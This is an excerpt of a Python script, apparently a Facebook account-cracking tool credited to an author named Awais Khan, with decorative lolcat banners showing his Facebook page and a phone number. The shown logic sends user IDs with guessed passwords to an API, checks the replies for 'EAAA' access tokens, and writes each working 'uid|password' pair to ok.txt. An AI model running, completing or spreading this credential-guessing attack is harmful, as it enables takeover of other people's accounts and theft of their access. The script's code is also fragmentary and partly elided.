...
#AUTHOR : AWAIS_KHAN
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO AWAIS KHAN
...
def linex():
	os.system('echo  "\n ★━━━━━━━━★━━━━━━━━━━━━━━━━━━━━★━━━━━━━━━━━★\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n   *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n   *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n        *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・\n    ☆ Author: AWAIS KHAN(PAKHTOON)       ☆\n    ☆ Fb page   : technical Awais        ☆\n    ☆ Whatsapp   : +923173725015    ║\n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・" | lolcat -a -d 2 -s 50')	
...
def main():
	...
	print("\033[96;1m  [J] FOLLOW PAGE. technical Awais\033[92;1m✘\033[91;1m✘")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[AWAIS-OM] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
